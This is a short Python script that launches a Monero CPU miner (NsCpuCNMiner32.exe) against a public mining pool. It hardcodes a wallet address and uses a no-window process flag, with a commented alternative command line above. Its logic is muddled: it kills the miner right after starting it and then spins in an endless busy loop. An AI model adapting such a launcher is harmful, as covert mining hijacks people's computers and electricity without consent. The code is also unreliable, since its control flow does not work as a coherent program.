#NsCpuCNMiner64 -o stratum+tcp://monerohash.com:3333 -u YOUR_WALLET_KEY_HERE -p x -t 4
import subprocess

p = subprocess.Popen(['NsCpuCNMiner32.exe', '-o', 'stratum+tcp://xmr-eu.dwarfpool.com:8050', '-u', '47sVh4nKwsxiUf3uMc4nzeZ4mPUYBomAV5qotTewrpHxHCFYrNGya8WBxCJR5vtKNR9oLJcvHoKFmMhxRPWa6igSAUKRWKW', '-p', 'x', '-t', '2'], stdin=subprocess.PIPE)
CREATE_NO_WINDOW = 0x08000000
subprocess.call('taskkill /F /IM NsCpuCNMiner32.exe', creationflags=CREATE_NO_WINDOW)

p.wait()

while True:
	pass




